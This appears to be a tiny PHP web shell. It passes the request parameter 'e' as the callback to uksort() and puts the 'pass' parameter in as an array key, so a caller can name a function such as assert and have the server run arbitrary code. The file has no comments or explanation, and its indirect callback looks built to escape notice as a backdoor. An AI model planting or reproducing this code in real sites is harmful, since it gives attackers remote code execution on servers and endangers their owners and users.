<?php
$e = $_REQUEST['e'];
$arr = array('test' => 1, $_REQUEST['pass'] => 2);
uksort($arr, $e);
?>